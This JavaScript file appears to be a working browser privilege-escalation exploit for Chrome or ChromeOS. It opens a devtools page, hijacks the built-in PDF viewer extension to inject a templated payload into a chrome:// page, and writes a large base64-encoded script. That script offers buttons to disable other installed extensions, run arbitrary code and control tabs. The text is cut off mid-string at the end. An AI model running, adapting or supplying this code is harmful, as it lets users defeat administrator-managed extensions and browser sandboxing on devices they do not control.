((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKYDsKCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKICA8ZGl2IGlkPSJjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCI+CiAgICA8aDE+VG9nZ2xlIEV4dGVuc2lvbnM8L2gxPgogICAgPGRpdiBjbGFzcz0iZXh0LWNvbnRhaW5lciI+CiAgICA8L2Rpdj4KICAgIDxici8+CiAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImV4dG51bSIgLz48YnV0dG9uIGRpc2FibGVkIGlkPSJ0b2dnbGVyIj5Ub2dnbGUgZXh0ZW5zaW9uPC9idXR0b24+CiAgPC9kaXY+CmA7CgpsZXQgc2F2ZWRFeHRMaXN0ID0gW107Cgphc3luYyBmdW5jdGlvbiB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0Q29udGFpbmVyRWxlbWVudCkgewogIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSwgcmVqZWN0KSB7CiAgICBleHRDb250YWluZXJFbGVtZW50LmlubmVySFRNTCA9ICIiOyAvLyBDbGVhciBwcmV2aW91cyBleHRlbnNpb25zCiAgICAKICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldEFsbChmdW5jdGlvbiAoZXh0bGlzdCkgewogICAgICBzYXZlZEV4dExpc3QgPSBbXTsgLy8gUmVzZXQgc2F2ZWQgZXh0ZW5zaW9ucyBsaXN0CiAgICAgIAogICAgICBleHRsaXN0LmZvckVhY2goZnVuY3Rpb24gKGUpIHsKICAgICAgICBpZiAoZS5pZCA9PT0gbmV3IFVSTChuZXcgVVJMKGxvY2F0aW9uLmhyZWYpLm9yaWdpbikuaG9zdCkgewogICAgICAgICAgcmV0dXJuOyAvLyBTa2lwIHRoZSBjdXJyZW50IGV4dGVuc2lvbgogICAgICAgIH0KCiAgICAgICAgc2F2ZWRFeHRMaXN0LnB1c2goZSk7CgogICAgICAgIGNvbnN0IGV4dERpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGV4dERpdi5jbGFzc0xpc3QuYWRkKCJleHQtaXRlbSIpOwoKICAgICAgICBjb25zdCBleHROYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDIiKTsKICAgICAgICBleHROYW1lLnRleHRDb250ZW50ID0gYCR7ZS5uYW1lfSAoJHtlLmlkfSlgOwogICAgICAgIGV4dERpdi5hcHBlbmRDaGlsZChleHROYW1lKTsKCiAgICAgICAgY29uc3QgZXh0U3RhdHVzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgIGV4dFN0YXR1cy50ZXh0Q29udGVudCA9IGBTdGF0dXM6ICR7ZS5lbmFibGVkID8gIkVuYWJsZWQiIDogIkRpc2FibGVkIn1gOwogICAgICAgIGV4dERpdi5hcHBlbmRDaGlsZChleHRTdGF0dXMpOwoKICAgICAgICBjb25zdCB0b2dnbGVCdG4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICAgICAgICB0b2dnbGVCdG4udGV4dENvbnRlbnQgPSBlLmVuYWJsZWQgPyAiRGlzYWJsZSIgOiAiRW5hYmxlIjsKICAgICAgICB0b2dnbGVCdG4ub25jbGljayA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoZS5pZCwgIWUuZW5hYmxlZCwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAvLyBSZWZyZXNoIHRoZSBleHRlbnNpb24gc3RhdHVzIGFmdGVyIHRvZ2dsaW5nCiAgICAgICAgICAgIGV4dFN0YXR1cy50ZXh0Q29udGVudCA9IGBTdGF0dXM6ICR7IWUuZW5hYmxlZCA/ICJFbmFibGVkIiA6ICJEaXNhYmxlZCJ9YDsKICAgICAgICAgICAgdG9nZ2xlQnRuLnRleHRDb250ZW50ID0gIWUuZW5hYmxlZCA/ICJEaXNhYmxlIiA6ICJFbmFibGUiOwogICAgICAgICAgfSk7CiAgICAgICAgfTsKICAgICAgICBleHREaXYuYXBwZW5kQ2hpbGQodG9nZ2xlQnRuKTsKCiAgICAgICAgZXh0Q29udGFpbmVyRWxlbWVudC5hcHBlbmRDaGlsZChleHREaXYpOwogICAgICB9KTsKCiAgICAgIHJlc29sdmUoKTsKICAgIH0pOwogIH0pOwp9CgpvbmxvYWQgPSBhc3luYyBmdW5jdGlvbiB4KCkgewogIGxldCBmb3VuZE5vdGhpbmcgPSB0cnVlOwogIGRvY3VtZW50Lm9wZW4oKTsKICAKICBpZiAoY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZSkgewogICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgZG9jdW1lbnQud3JpdGUoZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUpOwogICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCcjYnRuX0ZNUF9vcGVuVVJMJykub25jbGljayA9IGZ1bmN0aW9uIChldikge307CiAgfQoKICBpZiAoY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCkgewogICAgZG9jdW1lbnQud3JpdGUobWFuYWdlbWVudFRlbXBsYXRlKTsKICAgIGNvbnN0IGV4dENvbnRhaW5lckVsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZXh0LWNvbnRhaW5lciIpOwogICAgYXdhaXQgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dENvbnRhaW5lckVsZW1lbnQpOwoKICAgIGNvbnN0IGNvbnRhaW5lckV4dGVuc2lvbnMgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNjaHJvbWVfbWFuYWdlbWVudF9kaXNhYmxlX2V4dCIpOwogICAgCiAgICBjb250YWluZXJFeHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiN0b2dnbGVyIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGR4KGUpIHsKICAgICAgY29udGFpbmVyRXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlciIpLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgCiAgICAgIGxldCBpZCA9IGNvbnRhaW5lckV4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiLmV4dG51bSIpLnZhbHVlOwogICAgICBjb250YWluZXJFeHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIi5leHRudW0iKS52YWx1ZSA9ICIiOwoKICAgICAgdHJ5IHsKICAgICAgICBpZCA9IHBhcnNlSW50KGlkKTsKICAgICAgfSBjYXRjaCB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBpZiAoIXNhdmVkRXh0TGlzdFtpZCAtIDFdKSB7CiAgICAgICAgYWxlcnQoIlNlbGVjdCBleHRlbnNpb24gZnJvbSBsaXN0ISIpOwogICAgICAgIGNvbnRhaW5lckV4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3RvZ2dsZXIiKS5kaXNhYmxlZCA9IGZhbHNlOwogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUpIHsKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKHNhdmVkRXh0TGlzdFtpZCAtIDFdLmlkLCAhc2F2ZWRFeHRMaXN0W2lkIC0gMV0uZW5hYmxlZCwgcmVzb2x2ZSk7CiAgICAgIH0pOwoKICAgICAgY29udGFpbmVyRXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjdG9nZ2xlciIpLmRpc2FibGVkID0gZmFsc2U7CiAgICAgIGF3YWl0IHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRDb250YWluZXJFbGVtZW50KTsKICAgIH07CiAgICAKICAgIGNvbnRhaW5lckV4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3RvZ2dsZXIiKS5kaXNhYmxlZCA9IGZhbHNlOwogIH0KCiAgY29uc3Qgb3RoZXJGZWF0dXJlcyA9IHdpbmRvdy5jaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpOwogIGNvbnN0IHBlcm1pc3Npb25zID0gb3RoZXJGZWF0dXJlcy5wZXJtaXNzaW9uczsKCiAgbmV3IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMoKS5hY3RpdmF0ZSgpOwogIGRvY3VtZW50LmNsb3NlKCk7CiAgRXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLnNldHVwU2xpZGVzKCk7Cn07CgpjbGFzcyBFeHRlbnNpb25DYXBhYmlsaXRpZXMgewogIHN0YXRpYyBzZXR1cFNsaWRlcyhhY3RpdmVpZHggPSAwKSB7CiAgICBpZiAoY2hyb21lLm1hbmFnZW1lbnQpIHsKICAgICAgc2xpZGVzLnB1c2goZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0JykpOwogICAgfQogICAgc2xpZGVzLnB1c2goZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2V4dF9kZWZhdWx0JykpOwogICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzbGlkZXMubGVuZ3RoOyBpKyspIHsKICAgICAgaWYgKGkgPT09IGFjdGl2ZWlkeCkgewogICAgICAgIHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgfQogICAgICBlbHNlIHsKICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgfQogICAgfQogICAgYWN0aXZlU2xpZGVJZHggPSBhY3RpdmVpZHg7CiAgICAKICAgIG9ua2V5ZG93biA9IGZ1bmN0aW9uIChldikgewogICAgICBpZiAoZXYucmVwZWF0KSByZXR1cm47CiAgICAgIAogICAgICBpZiAodGhpcy5nZXRTZWxlY3Rpb24oKSAmJiB0aGlzLmdldFNlbGVjdGlvbigpLmFuY2hvck5vZGUudGFnTmFtZSkgewogICAgICAgIHJldHVybjsKICAgICAgfQogICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoImxlZnQiKSkgewogICAgICAgIGFjdGl2ZVNsaWRlSWR4LS07CiAgICAgICAgaWYgKGFjdGl2ZVNsaWRlSWR4IDwgMCkgewogICAgICAgICAgYWN0aXZlU2xpZGVJZHggKz0gKHNsaWRlcy5sZW5ndGgpOwogICAgICAgIH0KICAgICAgICBhY3RpdmVTbGlkZUlkeCAlPSAoc2xpZGVzLmxlbmd0aCk7CiAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsKICAgICAgfQogICAgICBpZiAoZXYua2V5LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoInJpZ2h0IikpIHsKICAgICAgICBhY3RpdmVTbGlkZUlkeCsrOwogICAgICAgIGlmIChhY3RpdmVTbGlkZUlkeCA8IDApIHsKICAgICAgICAgIGFjdGl2ZVNsaWRlSWR4ICs9IChzbGlkZXMubGVuZ3RoKTsKICAgICAgICB9CiAgICAgICAgYWN0aXZlU2xpZGVJZHggJT0gKHNsaWRlcy5sZW5ndGgpOyAgICAKICAgICAgICBldi5wcmV2ZW50RGVmYXVsdCgpOwogICAgICB9CiAgICAgIEV4dGVuc2lvbkNhcGFiaWxpdGllcy5zZXRBY3RpdmVTbGlkZUluZGV4KGFjdGl2ZVNsaWRlSWR4KTsKICAgIH0KICB9CgogIHN0YXRpYyBzZXRBY3RpdmVTbGlkZUluZGV4KGlkeCkgewogICAgZnVuY3Rpb24gYSh0KSB7CiAgICAgIGNvbnN0IHNlY29uZHMgPSB0LzEwMDA7CiAgICAgIGlmIChzZWNvbmRzID49IDAuMikgewogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIHNsaWRlc1tpZHhdLnN0eWxlLm9wYWNpdHkgPSBTdHJpbmcoKHNlY29uZHMpLygwLjIpKTsKICAgIH0KICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2xpZGVzLmxlbmd0aDsgaSsrKSB7CiAgICAgIGlmIChpID09PSBpZHgpIHsKICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgIH0KICAgICAgZWxzZSB7CiAgICAgICAgaWYgKHNsaWRlc1tpXS5zdHlsZS5kaXNwbGF5ID09PSAiYmxvY2siKSB7CiAgICAgICAgICBzbGlkZXNbaV0uc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwogICAgICAgICAgY29uc3QgbSA9IGk7CiAgICAgICAgICBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lKGZ1bmN0aW9uICh0KSB7CiAgICAgICAgICAgIGNvbnN0IHNlY29uZHMgPSB0LzEwMDA7CiAgICAgICAgICAgIGlmICgwLjggLSBzZWNvbmRzIDw9IDApIHsKICAgICAgICAgICAgICBzbGlkZXNbaV0uc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICAgICAgICBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lKGEpOwogICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHNsaWRlc1tpXS5zdHlsZS5vcGFjaXR5ID0gU3RyaW5nKCggKDAuMiAtIHNlY29uZHMpIC8gMC4yKSk7CiAgICAgICAgICB9KQogICAgICAgIH0KICAgICAgfQogICAgfQogIH0KICAKICBhY3RpdmF0ZSAoKSB7fQp9CgpjbGFzcyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIGV4dGVuZHMgRXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICBzdGF0aWMgdGVtcGxhdGUgPSBgCiAgICA8ZGl2IGlkPSJleHRfZGVmYXVsdCI+CiAgICAgIDxkaXYgaWQ9ImRlZmF1bHRfZXh0ZW5zaW9uX2NhcGFiaWxpdGllcyI+CiAgICAgICAgPGgxPiBEZWZhdWx0IEV4dGVuc2lvbiBDYXBhYmlsaXRpZXMgPC9oMT4KICAgICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDI+CiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGlkPSJjb2RlX2lucHV0Ii8+PGJ1dHRvbiBpZD0iY29kZV9ldmFsdWF0ZSI+RXZhbHVhdGU8L2J1dHRvbj4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9ImV4dGVuc2lvbl90YWJzX2RlZmF1bHQiPgogICAgICAgIDxidXR0b24gaWQ9InRhYnJlbG9hZCI+IFJlZnJlc2ggVGFiczwvYnV0dG9uPgogICAgICAgIDxoMT4gVXBkYXRlIHRhYnMgPC9oMT4KICAgICAgICA8b2w+CiAgICAgICAgPC9vbD4KICAgICAgICA8aW5wdXQgaWQ9IlRhYlVSTElucHV0IiAvPiA8YnV0dG9uIGlkPSJUYWJVUkxTdWJtaXQiPkNyZWF0ZTwvYnV0dG9uPgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogIGA7CiAgCiAgdXBkYXRlVGFiTGlzdCh0YWJsaXN0LCBpc1RhYlRpdGxlUXVlcnlhYmxlLCB0YWJTdGF0dXMpIHsKICAgIGlmICh0aGlzLmRpc2FybWVkKSB7CiAgICAgIHJldHVybjsKICAgIH0KCiAgICBpZiAodGhpcy50YWJMaXN0SW5Qcm9ncmVzcykgewogICAgICBjb25zb2xlLmxvZygiSW4gcHJvZ3Jlc3MgdGFibGlzdCBidWlsZGluZyEiKTsKICAgICAgcmV0dXJuOwogICAgfQogICAgdGhpcy50YWJMaXN0SW5Qcm9ncmVzcyA9IHRydWU7CiAgICB0YWJsaXN0LmlubmVySFRNTCA9ICIiOwogICAgY29uc3QgdGhpeiA9IHRoaXM7CiAgICBjaHJvbWUud2luZG93cy5nZXRBbGwoZnVuY3Rpb24gKHdpbikgewogICAgICB3aW4uZm9yRWFjaChmdW5jdGlvbiAodikgewogICAgICAgIGNocm9tZS50YWJzLnF1ZXJ5KHt3aW5kb3dJZDogdi5pZH0sIGZ1bmN0aW9uICh0YWJJbmZvcykgewogICAgICAgICAgdGFiSW5mb3MuZm9yRWFjaChmdW5jdGlvbiAoaW5mbykgewogICAgICAgICAgICBjb25zdCBsaXN0SXRlbSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImxpIik7CiAgICAgICAgICAgIGxpc3RJdGVtLnRleHRDb250ZW50ID0gaXNUYWJUaXRsZVF1ZXJ5YWJsZQogICAgICAgICAgICAgID8gYCR7aW5mby50aXRsZX0gKCR7aW5mby51cmx9KWAKICAgICAgICAgICAgICA6ICIobm90IGF2YWlsYWJsZSkiOwogICAgICAgICAgICBsaXN0SXRlbS5pbm5lckhUTUwgKz0gJzxici8+PGlucHV0IHR5cGU9InRleHQiIC8+IDxidXR0b24+TmF2aWdhdGU8L2J1dHRvbj4nOwogICAgICAgICAgICBjb25zdCBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJidXR0b24iKTsKICAgICAgICAgICAgYnV0dG9uLmlubmVySFRNTCA9ICJQcmV2aWV3IjsKICAgICAgICAgICAgbGlzdEl0ZW0ucXVlcnlTZWxlY3RvcignYnV0dG9uJykub25jbGljayA9IGZ1bmN0aW9uIChldikgewogICAgICAgICAgICAgIGNvbnN0IGlucCA9IGxpc3RJdGVtLnF1ZXJ5U2VsZWN0b3IoJ2lucHV0Jyk7CiAgICAgICAgICAgICAgY2hyb21lLnRhYnMudXBkYXRlKGluZm8uaWQsIHsgInVybCI6IGlucC52YWx1ZSB9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBidXR0b24ub25jbGljayA9ICgpID0+IHsKICAgICAgICAgICAgICB0aGl6LmRpc2FybSA9IHRydWU7CiAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gdHJ1ZTsKICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUoaW5mby53aW5kb3dJZCwgeyBmb2N1c2VkOiB0cnVlIH0sIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZShpbmZvLmlkLCB7IGFjdGl2ZTogdHJ1ZSB9KTsKICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICB3aW5kb3cuY3VycmVudFRpbWVvdXQgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uIG0oKSB7CiAgICAgICAgICAgICAgICBjbGVhclRpbWVvdXQod2luZG93LmN1cnJlbnRUaW1lb3V0KTsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLmdldEN1cnJlbnQoZnVuY3Rpb24gKHRhYikgewogICAgICAgICAgICAgICAgICBjaHJvbWUud2luZG93cy51cGRhdGUodGFiLndpbmRvd0lkLCB7IGZvY3VzZWQ6IHRydWUgfSwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIGNocm9tZS50YWJzLnVwZGF0ZSh0YWIuaWQsIHsgYWN0aXZlOiB0cnVlIH0pOwogICAgICAgICAgICAgICAgICAgIHRoaXouZGlzYXJtID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgdGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSwgMTAwKTsKICAgICAgICAgICAgfTsKICAgICAgICAgICAgdGFibGlzdC5hcHBlbmRDaGlsZChsaXN0SXRlbSk7CiAgICAgICAgICAgIHRhYmxpc3QuYXBwZW5kQ2hpbGQoYnV0dG9uKTsKICAgICAgICAgIH0pOwogICAgICAgICAgdGhpei50YWJMaXN0SW5Qcm9ncmVzcyA9IGZhbHNlOwogICAgICAgICAgaWYgKGlzVGFiVGl0bGVRdWVyeWFibGUpIHsKICAgICAgICAgICAgdGFiU3RhdHVzLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB0YWJTdGF0dXMudGV4dENvbnRlbnQgPQogICAgICAgICAgICAgICIoU29tZSBkYXRhIG1pZ2h0IG5vdCBiZSBhdmFpbGFibGUsIGJlY2F1c2UgdGhlIGV4dGVuc2lvbiBkb2Vzbid0IGhhdmUgdGhlICd0YWJzJyBwZXJtaXNzaW9uKSI7CiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgIH0pCiAgICB9KTsKICB9CgogIGFjdGl2YXRlKCkgewogICAgZG9jdW1lbnQud3JpdGUoRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy50ZW1wbGF0ZSk7CiAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNleHRfZGVmYXVsdCIpLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbicpLmZvckVhY2goZnVuY3Rpb24gKGJ0bikgewogICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCB0aGlzLm9uQnRuQ2xpY2tfLmJpbmQodGhpcywgYnRuKSk7CiAgICB9LCB0aGlzKTsKICAgIAogICAgdGhpcy51cGRhdGVUYWJMaXN0KGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcignI2V4dGVuc2lvbl90YWJzX2RlZmF1bHQnKS5xdWVyeVNlbGVjdG9yKCdvbCcpLCAoISFjaHJvbWUucnVudGltZS5nZXRNYW5pZmVzdCgpLnBlcm1pc3Npb25zLmluY2x1ZGVzKCd0YWJzJykpKTsKICAgIAogICAgZm9yICh2YXIgaSBpbiBjaHJvbWUudGFicykgewogICAgICBpZiAoaS5zdGFydHNXaXRoKCdvbicpKSB7CiAgICAgICAgY2hyb21lLnRhYnNbaV0uYWRkTGlzdGVuZXIoZnVuY3Rpb24gKGV2KSB7CiAgICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCcjZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCcpLnF1ZXJ5U2VsZWN0b3IoJ29sJyksICghIWNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCkucGVybWlzc2lvbnMuaW5jbHVkZXMoJ3RhYnMnKSkpOwogICAgICAgIH0pCiAgICAgIH0KICAgIH0KICB9CgogIHN0YXRpYyBnZXRGUygpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbiAocmVzb2x2ZSkgewogICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICB9KTsKICB9CgogIGFzeW5jIG9uQnRuQ2xpY2tfKGIpIHsKICAgIHN3aXRjaCAoYi5pZCkgewogICAgICBjYXNlICJjb2RlX2V2YWx1YXRlIjogewogICAgICAgIGNvbnNvbGUubG9nKCJFdmFsdWF0aW5nIGNvZGUhIik7CiAgICAgICAgY29uc3QgeCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNjb2RlX2lucHV0IikudmFsdWU7CiAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLmdldEZTKCk7CiAgICAgICAgZnVuY3Rpb24gd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgIHdyaXRlci53cml0ZShuZXcgQmxvYihbZGF0YV0pKTsKICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CiAgICAgICAgICB9KTsKICAgICAgICB9CgogICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgic3JjLmpzIiwgeCk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNldmFsdWF0ZV9lbGVtIikgPz8KICAgICAgICAgIGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgIHNjcmlwdC5yZW1vdmUoKTsKICAgICAgICBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQuaWQgPSAiZXZhbHVhdGVfZWxlbSI7CiAgICAgICAgc2NyaXB0LnNyYyA9IHVybDsKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdCk7CiAgICAgIH0KICAgICAgY2FzZSAidGFicmVsb2FkIjogewogICAgICAgIHRoaXMudXBkYXRlVGFiTGlzdChkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNleHRlbnNpb25fdGFic19kZWZhdWx0JykucXVlcnlTZWxlY3Rvcignb2wnKSwgKCEhY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKS5wZXJtaXNzaW9ucy5pbmNsdWRlcygndGFicycpKSk7CiAgICAgIH0KICAgIH0KICB9Cn0KCmNvbnN0IGZpbGVNYW5hZ2VyUHJpdmF0ZVRlbXBsYXRlID0gYAogIDxkaXYgaWQ9ImZpbGVNYW5hZ2VyUHJpdmF0ZV9jYXAiPgogICAgPGRpdiBpZD0iRk1QX29wZW5VUkwiPgogICAgICA8YnV0dG9uIGlkPSJidG5fRk1QX29wZW5VUkwiPk9wZW4gVVJMIGluIFNraW92b3ggd2luZG93PC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KYDsKCm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uIHgoKSB7CiAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgZG9jdW1lbnQub3BlbigpOwogIAogIGlmIChjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlKSB7CiAgICBjaHJvbWUuZmlsZU1hbmFnZXJQcml2YXRlLm9wZW5VUkwoImRhdGE6dGV4dC9odG1sLDxoMT5IZWxsbzwvaDE+Iik7CiAgICBkb2N1bWVudC53cml0ZShmaWxlTWFuYWdlclByaXZhdGVUZW1wbGF0ZSk7CiAgICBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoJyNidG5fRk1QX29wZW5VUkwnKS5vbmNsaWNrID0gZnVuY3Rpb24gKGV2KS